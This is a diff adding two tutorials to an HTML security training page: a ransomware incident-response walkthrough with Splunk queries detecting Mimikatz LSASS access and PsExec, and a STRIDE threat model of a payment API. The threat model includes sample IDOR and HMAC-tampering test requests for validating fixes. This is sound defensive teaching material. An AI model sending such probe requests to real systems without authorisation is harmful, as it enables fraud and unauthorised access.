+# Trace back from patient zero — what happened 30-60 min before encryption?
+# Look for:
+# - Phishing: EventCode 4625 (failed login) followed by 4624 (success) from external IP
+# - RDP brute force: high-frequency 4625 from single source, then 4624
+# - Vulnerable service: web log 200 on /admin or suspicious URI before lateral movement
+
+# Check if initial access used a known ransomware lateral movement tool:
+# Mimikatz indicators:
+index=windows EventCode=10 TargetImage="*lsass.exe" GrantedAccess IN ("0x1010","0x1038","0x40")
+| stats count by SourceImage, ComputerName, TargetImage
+
+# PsExec lateral movement:
+index=windows EventCode=7045 ServiceName="PSEXESVC" earliest=-8h
+| table _time, ComputerName, ServiceFileName</div>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">4</div>
+              <div class="tutorial-step-body">
+                <strong>T+1:00 — Communicate to stakeholders. Use facts, not speculation.</strong>
+                <div class="code-block">## Stakeholder Update Template — T+60 minutes
+Subject: INC-2026-0408-001 Active Response Update
+
+**Status:** ACTIVE — Contained but under investigation
+**Severity:** SEV2 (upgrading to SEV1 if spread confirmed beyond 2 hosts)
+**Affected Systems:** SRV-PROD-03, SRV-PROD-07 (isolated)
+**Business Impact:** Finance database unavailable; other production systems unaffected
+**Customer Impact:** [UNKNOWN — confirming now] / [None confirmed]
+
+**What we know:**
+- Ransomware-like file encryption started at 02:14 UTC
+- 2 of 6 production servers affected, isolated at 02:24 UTC (10 min)
+- Memory snapshots captured; forensic investigation in progress
+
+**What we are doing:**
+- IR Team: Tracing initial access vector (ETA 90 min)
+- IT Ops: Beginning restore assessment from last backup (02:00 UTC)
+- Security: Monitoring remaining production hosts for spread
+
+**Next update:** T+60 minutes or on status change
+
+DO NOT: Reboot servers, pay ransom, or make public statements without legal/PR approval.</div>
+                <p>Stakeholders need facts + actions + timeline. "We are looking into it" ends careers. "2 servers isolated at T+10 minutes, forensics in progress, next update T+60" builds trust. Write updates in a dedicated Slack channel or Teams bridge — everything is documented automatically.</p>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">5</div>
+              <div class="tutorial-step-body">
+                <strong>T+4:00 — Recovery decision gate. Restore vs. remediate-in-place.</strong>
+                <div class="code-block"># Recovery decision matrix:
+# Option A: Restore from backup
+#   - Last clean backup: 02:00 UTC (14 min before encryption)
+#   - RTO (restore time): ~4 hours for both servers
+#   - Risk: None if backup integrity verified (SHA256 check before restore)
+#   - Recommended if: backup confirmed clean + no complex persistence found
+
+# Verify backup integrity before restore:
+sha256sum SRV-PROD-03-backup-20260408-0200.tar.gz
+# Compare against stored hash from backup job metadata
+
+# Option B: Remediate affected hosts
+#   - Requires complete attacker eviction evidence
+#   - Forensics must confirm: all persistence removed, no implants remain
+#   - Risk: Attacker may have left secondary backdoor
+#   - Only choose this if: backup is unavailable or partial
+
+# After restore — do NOT reconnect to network until:
+# 1. Patch applied for the exploit used in initial access
+# 2. Compromised credential rotated
+# 3. EDR confirmed clean on restored image
+# 4. Security sign-off documented in IR ticket</div>
+              </div>
+            </div>
+          </div>
         </div>
 
         <h3>References &amp; Standards</h3>
@@ -2361,6 +3060,155 @@ MITIGATIONS SUMMARY:
 
         <div class="visual-tip">
           <strong>Fast Review Rule:</strong> If a release changes auth, secrets handling, or trust boundaries, run a threat model delta review before deployment. This 20-minute check catches high-impact design regressions early.
+        </div>
+
+        <div class="deep-tutorial">
+          <div class="deep-tutorial-header">
+            <span class="tutorial-badge">Hands-On Tutorial</span>
+            <h3>STRIDE Threat Modeling for a Payment API: Full Worked Example</h3>
+            <p class="tutorial-scenario"><strong>Scenario:</strong> Your team is shipping a new payment processing API in 3 weeks. The API accepts card details from the browser, passes them to an internal payment service, which calls Stripe and writes results to PostgreSQL. Security review is scheduled for Day 1 of sprint 3. You need to deliver a structured threat model before that meeting.</p>
+          </div>
+
+          <div class="tutorial-steps">
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">1</div>
+              <div class="tutorial-step-body">
+                <strong>Draw the Data Flow Diagram (DFD) — this is your working document.</strong>
+                <p>A DFD has 4 elements: External Entities (users, 3rd parties), Processes (your services), Data Stores (databases, caches), and Data Flows (arrows showing data movement). Every arrow that crosses a trust boundary needs a control.</p>
+                <div class="code-block">## DFD for Payment Processing API
+
+External Entities:
+  [Browser]          → Customer (untrusted)
+  [Stripe API]       → Third-party processor (partially trusted)
+  [Internal Ops]     → Operations team (trusted internal)
+
+Processes:
+  [API Gateway]      → Auth, rate limiting, TLS termination
+  [Payment Service]  → Core business logic, charge validation
+  [Audit Logger]     → Immutable event logging
+
+Data Stores:
+  [PostgreSQL]       → Charge records, card metadata (encrypted at rest)
+  [Redis]            → Session tokens, rate limit counters
+
+Data Flows (with trust boundary markers):
+  Browser → [TB1: Internet boundary] → API Gateway (HTTPS/JWT)
+  API Gateway → [TB2: DMZ boundary] → Payment Service (mTLS)
+  Payment Service → [TB3: Internal] → PostgreSQL (TLS + parameterized SQL)
+  Payment Service → [TB4: External] → Stripe API (HTTPS + API key)
+
+Trust Boundaries: TB1, TB2, TB3, TB4 — controls required at each</div>
+                <p>If you cannot draw this diagram, you do not understand your own system well enough to threat model it. Stop and interview the developers/architects first.</p>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">2</div>
+              <div class="tutorial-step-body">
+                <strong>Apply STRIDE: work through every data flow at every trust boundary.</strong>
+                <div class="code-block">## STRIDE Analysis — Payment Service (TB2 → TB3 boundary)
+
+## S: Spoofing
+Threat: Stolen JWT token reused after expiry or user logout
+Attack: Attacker captures valid token from XSS payload, replays after victim logs out
+Control: Short token expiry (15 min) + server-side revocation list in Redis
+Status: PARTIAL — revocation list not yet implemented
+Action: Engineer to add Redis-backed revocation before release [P1]
+
+## T: Tampering
+Threat: Client modifies payment amount in transit between browser and API
+Attack: MITM or browser extension intercepts POST /charge, changes amount: 100 → 0.01
+Control: Sign payload server-to-server (HMAC-SHA256), verify signature before processing
+Status: MISSING — no payload signing currently
+Action: Add HMAC-SHA256 signing on internal service-to-service calls [P1 BLOCKER]
+
+## R: Repudiation  
+Threat: User denies initiating a charge; no audit trail to prove otherwise
+Attack: Customer claims fraudulent charge; no timestamped, immutable record
+Control: Immutable audit log (append-only DB table with user_id, timestamp, amount, card_last4)
+Status: DONE (audit_log table exists, tested)
+
+## I: Information Disclosure
+Threat: Card data (PAN, CVV) appears in application error logs
+Attack: Developer logs raw request body during exception; log aggregation exposes PAN
+Control: Structured error logging — never log raw request body; mask PAN (**1234)
+Status: MISSING — exception handler logs full stack including request body
+Action: Fix error handler to strip card fields before logging [P1 PCI-DSS Req 3.4]
+
+## D: Denial of Service
+Threat: Attacker floods /api/charge with 10k requests/sec, overloads payment service
+Attack: Scripted load against payment endpoint (low sophistication)
+Control: Rate limiting 100 req/min/user at API gateway (already deployed)
+Status: DONE
+
+## E: Elevation of Privilege
+Threat: IDOR — attacker changes user_id parameter to charge another user's account
+Attack: POST /charge with {"user_id": 9999, "amount": 50} using own valid JWT
+Control: Server-side check: assert token.subject == payment_request.user_id before processing
+Status: PARTIAL — check exists in 2 of 3 charge endpoints; endpoint /charge/recurring not checked
+Action: Add auth check to /charge/recurring before release [P1]</div>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">3</div>
+              <div class="tutorial-step-body">
+                <strong>Prioritize findings and convert to engineering tickets.</strong>
+                <div class="code-block">## Risk Priority Matrix — Payment API Threat Model v1.2
+
+| STRIDE | Finding                    | DREAD Score | Priority | Owner           |
+|--------|----------------------------|-------------|----------|-----------------|
+| T      | No payload signing         | 9.2         | P1 BLOCK | backend-team    |
+| I      | PAN in error logs          | 9.0         | P1 BLOCK | backend-team    |
+| E      | IDOR on /charge/recurring  | 8.5         | P1 BLOCK | backend-team    |
+| S      | No token revocation        | 7.1         | P2       | auth-team       |
+| R      | Audit log confirmed OK     | —           | DONE     | —               |
+| D      | Rate limiting confirmed OK | —           | DONE     | —               |
+
+## DREAD Scoring (quick):
+# D=Damage, R=Reproducibility, E=Exploitability, A=Affected users, D=Discoverability
+# Score 1-10 per dimension, average = DREAD score
+# Payload signing missing: D=10(full fraud) R=10(trivial) E=9(MITM attack) A=10(all) D=8 = 9.4
+
+## Release Gate:
+# P1 BLOCK items must have code fix + test + sign-off BEFORE this API ships.
+# P2 items must have tickets assigned and scheduled within 1 sprint.
+# Threat model document to be stored in /docs/security/payment-api-tm-v1.2.md</div>
+              </div>
+            </div>
+            <div class="tutorial-step">
+              <div class="tutorial-step-num">4</div>
+              <div class="tutorial-step-body">
+                <strong>Validate controls with a targeted test after the engineering fixes.</strong>
+                <div class="code-block"># After engineers fix: test payload tampering control
+# Intercept payment request in Burp Suite and modify amount:
+
+POST /api/v1/charge HTTP/1.1
+Host: payment.corp-internal.com
+Authorization: Bearer [VALID_JWT]
+Content-Type: application/json
+
+{"user_id": 501, "amount": 100.00, "card_token": "tok_visa", "hmac": "TAMPERED"}
+
+# If HMAC validation works: server returns 400 Bad Request {"error":"invalid signature"}
+# If HMAC validation fails: server accepts tampered request → re-open ticket immediately
+
+# Test IDOR on /charge/recurring:
+POST /api/v1/charge/recurring
+Authorization: Bearer [JWT for user 501]
+{"user_id": 9999, "schedule": "monthly", "amount": 50.00}
+# Expected: 403 Forbidden {"error":"authorization denied"}
+# Actual (before fix was vulnerable): 200 OK — would have processed the charge
+
+# PAN logging test — trigger a deliberate validation error:
+POST /api/v1/charge with malformed card_number="4111111111111111"
+# Check log output: should show {"card_number": "****1111"}, NOT full PAN</div>
+              </div>
+            </div>
+          </div>
+
+          <figure class="tutorial-screenshot">
+            <img src="assets/tutorial-threat-model.svg" alt="Threat model worksheet showing payment API data flow diagram with trust boundaries, STRIDE analysis table with Spoofing, Tampering, Information Disclosure findings marked as Missing or Partial, and 4 priority action items" />
+            <figcaption>Complete STRIDE analysis for Payment API: DFD with 4 trust boundaries, 6 STRIDE threats assessed — 3 blockers found (payload signing missing, PAN in logs, IDOR on /charge/recurring). Release gate defined: all P1 items must be fixed and validated before deployment</figcaption>
+          </figure>
         </div>
 
         <h3>References &amp; Standards</h3>
